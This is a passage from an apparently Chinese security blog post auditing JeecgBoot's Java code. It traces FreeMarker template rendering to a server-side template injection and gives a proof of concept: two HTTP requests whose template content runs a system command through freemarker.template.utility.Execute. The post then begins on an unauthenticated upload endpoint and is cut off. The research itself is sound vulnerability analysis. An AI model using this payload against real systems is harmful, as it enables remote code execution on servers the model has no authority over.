</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">getJSONObject</span><span class="p">(</span><span class="n">var13</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">var8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var7</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;paramName&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var7</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;paramValue&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">var8</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">var9</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">var10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ExpressUtil</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">var9</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="s">&#34;${&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">var8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var10</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="s">&#34;&#39;${&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">var8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;}&#39;&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var10</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">var8</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">var9</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">var14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ExpressUtil</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">var9</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">var8</span><span class="p">),</span><span class="w"> </span><span class="n">var14</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">var8</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FreeMarkerUtils</span><span class="p">.</span><span class="na">a</span><span class="p">(</span><span class="n">var1</span><span class="p">,</span><span class="w"> </span><span class="n">var2</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">var1</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€é‡è¦çš„ä¸€è¡Œä»£ç ï¼š<code>var1 = FreeMarkerUtils.a(var1, var2);</code>ï¼Œå¾ˆæ˜æ˜¾çš„ä¸€ä¸ªFreeMarkerçš„æ¨¡æ¿è§£æäº†ï¼Œåé¢çš„ä¸œè¥¿å°±ä¸æ‰¾äº†ï¼Œæ‰¾åˆ°æœ€åè‚¯å®šä¹Ÿå°±æ˜¯ä¸€ä¸ªæ¨¡æ¿è§£æã€‚æˆ‘ä»¬ç›´æ¥å»æ‰“ä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å›æ˜¾ã€‚
<img src="/images/JeecgBoot/7.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå¾—åˆ°äº†whoamiçš„å›æ˜¾ï¼Œè¯´æ˜æ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚ä¹‹åè¿™ç§èƒ½RCEçš„ä¼šæ‰“å†…å­˜é©¬ï¼Œè¿™é‡Œå†…å­˜é©¬è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œæ‰€ä»¥å…ˆæ”¾ä¸€ä¸‹äº†ã€‚</p>
<h2 id="sendmsgæ¥å£">sendMsgæ¥å£
</h2><p>è€è§„çŸ©ï¼Œç›´æ¥å»çœ‹ä¸€ä¸‹ä»£ç ã€‚
æˆ‘ä»¬æ˜¯å…ˆé€šè¿‡import freemarkerå…ˆæ‰¾åˆ°äº†è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ã€‚
æˆ‘ä»¬è¿™é‡Œç›´æ¥çœ‹å®ƒçš„ä»£ç ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">sendMessage</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">msgType</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">templateCode</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">sentTo</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="n">List</span><span class="o">&lt;</span><span class="n">SysMessageTemplate</span><span class="o">&gt;</span><span class="w"> </span><span class="n">sysSmsTemplates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysMessageTemplateService</span><span class="p">.</span><span class="na">selectByCode</span><span class="p">(</span><span class="n">templateCode</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="n">SysMessage</span><span class="w"> </span><span class="n">sysMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SysMessage</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sysSmsTemplates</span><span class="p">.</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">SysMessageTemplate</span><span class="w"> </span><span class="n">sysSmsTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysSmsTemplates</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsType</span><span class="p">(</span><span class="n">msgType</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsReceiver</span><span class="p">(</span><span class="n">sentTo</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="c1">//æ¨¡æ¿æ ‡é¢˜  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">String</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysSmsTemplate</span><span class="p">.</span><span class="na">getTemplateName</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="c1">//æ¨¡æ¿å†…å®¹  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">String</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysSmsTemplate</span><span class="p">.</span><span class="na">getTemplateContent</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">StringWriter</span><span class="w"> </span><span class="n">stringWriter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringWriter</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">Template</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">template</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Template</span><span class="p">(</span><span class="s">&#34;SysMessageTemplate&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">freemarkerConfig</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">template</span><span class="p">.</span><span class="na">process</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">stringWriter</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">TemplateException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stringWriter</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsTitle</span><span class="p">(</span><span class="n">title</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsContent</span><span class="p">(</span><span class="n">content</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsParam</span><span class="p">(</span><span class="n">JSONObject</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">map</span><span class="p">));</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsSendTime</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Date</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsSendStatus</span><span class="p">(</span><span class="n">SendMsgStatusEnum</span><span class="p">.</span><span class="na">WAIT</span><span class="p">.</span><span class="na">getCode</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">sysMessage</span><span class="p">.</span><span class="na">setEsSendNum</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="k">if</span><span class="p">(</span><span class="n">sysMessageService</span><span class="p">.</span><span class="na">save</span><span class="p">(</span><span class="n">sysMessage</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æ˜¯å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å¾—å‡ºæ¥çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ä¸ªè€Œå·²çš„freemarkerçš„æ¨¡æ¿æ”¾ä¸Šå»ï¼Œå¦‚æœåé¢æœ‰è°ƒç”¨çš„è¯å°±ä¼šè§¦å‘æ‰§è¡Œã€‚ç„¶åæˆ‘ä»¬è·Ÿè°ƒç”¨ï¼Œæ‰¾åˆ°å¯¹åº”çš„æ¥å£ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@PostMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/sendMsg&#34;</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">SysMessageTemplate</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">sendMessage</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">MsgParams</span><span class="w"> </span><span class="n">msgParams</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">SysMessageTemplate</span><span class="o">&gt;</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">SysMessageTemplate</span><span class="o">&gt;</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">MessageDTO</span><span class="w"> </span><span class="n">md</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MessageDTO</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">md</span><span class="p">.</span><span class="na">setToAll</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">md</span><span class="p">.</span><span class="na">setTitle</span><span class="p">(</span><span class="s">&#34;æ¶ˆæ¯å‘é€æµ‹è¯•&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">md</span><span class="p">.</span><span class="na">setTemplateCode</span><span class="p">(</span><span class="n">msgParams</span><span class="p">.</span><span class="na">getTemplateCode</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">md</span><span class="p">.</span><span class="na">setToUser</span><span class="p">(</span><span class="n">msgParams</span><span class="p">.</span><span class="na">getReceiver</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">md</span><span class="p">.</span><span class="na">setType</span><span class="p">(</span><span class="n">msgParams</span><span class="p">.</span><span class="na">getMsgType</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">String</span><span class="w"> </span><span class="n">testData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">msgParams</span><span class="p">.</span><span class="na">getTestData</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="n">oConvertUtils</span><span class="p">.</span><span class="na">isNotEmpty</span><span class="p">(</span><span class="n">testData</span><span class="p">)){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">testData</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">md</span><span class="p">.</span><span class="na">setData</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">sysBaseApi</span><span class="p">.</span><span class="na">sendTemplateMessage</span><span class="p">(</span><span class="n">md</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">success</span><span class="p">(</span><span class="s">&#34;æ¶ˆæ¯å‘é€æˆåŠŸï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;å‘é€æ¶ˆæ¯å‡ºé”™&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">error500</span><span class="p">(</span><span class="s">&#34;å‘é€æ¶ˆæ¯å‡ºé”™ï¼&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¦‚ä½•å°±å¯ä»¥æ‰¾åˆ°è¿™ä¸ªé‡Œé¢è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œåˆ©ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨è¦ç¼–è¾‘ä¸€ä¸‹æ•°æ®åº“ä¸­çš„ä¸œè¥¿ï¼Œæ¯•ç«Ÿå‰é¢çš„é‚£ä¸ªcontextæ˜¯ä»æ•°æ®åº“ä¸­è·å–çš„ï¼Œæ‰¾ä¸€ä¸‹ç¼–è¾‘çš„åœ°æ–¹ã€‚
<img src="/images/JeecgBoot/8.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
æ‰¾åˆ°è¿™é‡Œï¼ŒåŸºæœ¬å°±å¯ä»¥ç¡®å®šè·¯ç”±äº†ï¼Œè¿™è¾¹æˆ‘ä»¬å…ˆæ‰¾å¯ä»¥ç¼–è¾‘çš„åœ°æ–¹ã€‚
<img src="/images/JeecgBoot/9.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
ç™»å½•ç®¡ç†å‘˜è´¦å·è¿›å…¥è¿™ä¸ªç•Œé¢ï¼Œå°±å¯ä»¥æ–°å»ºæ¨¡æ¿äº†ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºpocå‡ºæ¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /jeecg-boot/sys/message/sysMessageTemplate/add
</span></span><span class="line"><span class="cl">X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcxMDYyNDgsInVzZXJuYW1lIjoiYWRtaW4ifQ.RnH0QRNdTDoE3owB2q6IN92xfGbHcRKo2yGck5CdvOY
</span></span><span class="line"><span class="cl">{&#34;templateName&#34;:&#34;demo5&#34;,&#34;templateCode&#34;:&#34;demo5&#34;,&#34;templateType&#34;:&#34;2&#34;,&#34;templateContent&#34;:&#34;&lt;#assign value=\&#34;freemarker.template.utility.Execute\&#34;?new()&gt;${value(\&#34;calc\&#34;)}&#34;,
</span></span><span class="line"><span class="cl">&#34;templateTestJson&#34;:&#34; &#34;}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg
</span></span><span class="line"><span class="cl">X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcxMDYyNDgsInVzZXJuYW1lIjoiYWRtaW4ifQ.RnH0QRNdTDoE3owB2q6IN92xfGbHcRKo2yGck5CdvOY
</span></span><span class="line"><span class="cl">{&#34;templateCode&#34;:&#34;demo5&#34;,&#34;templateName&#34;:&#34;demo5&#34;,&#34;templateContent&#34;:&#34;&lt;#assign value=\&#34;freemarker.template.utility.Execute\&#34;?new()&gt;${value(\&#34;calc\&#34;)}&#34;,&#34;testData&#34;:&#34;{\&#34;louis\&#34;:\&#34;louis\&#34;}&#34;,&#34;msgType&#34;:&#34;2&#34;,&#34;receiver&#34;:&#34;admin&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥æ‰“è¿›å»å°±å¯ä»¥äº†ï¼Œè®°å¾—æ”¹Tokenã€‚</p>
<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´">æ–‡ä»¶ä¸Šä¼ æ¼æ´
</h1><p>åœ¨ä»£ç å½“ä¸­è¿˜æ‰¾åˆ°äº†ä¸€ä¸ªæœªæˆæƒçš„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œè¿™ä¸ªä¸éœ€è¦æˆæƒå°±å¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯è®¿é—®çš„è¯éœ€è¦Tokenï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯éœ€è¦ç™»å½•çš„ã€‚</p>
<h2 id="uploadæ¥å£">uploadæ¥å£
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ResponseBody</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&#34;/upload&#34;</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="c1">//@RequiresRoles(&#34;admin&#34;)  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Result</span><span class="w"> </span><span class="nf">upload</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="s">&#34;file&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">MultipartFile</span><span class="w"> </span><span class="n">multipartFile</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
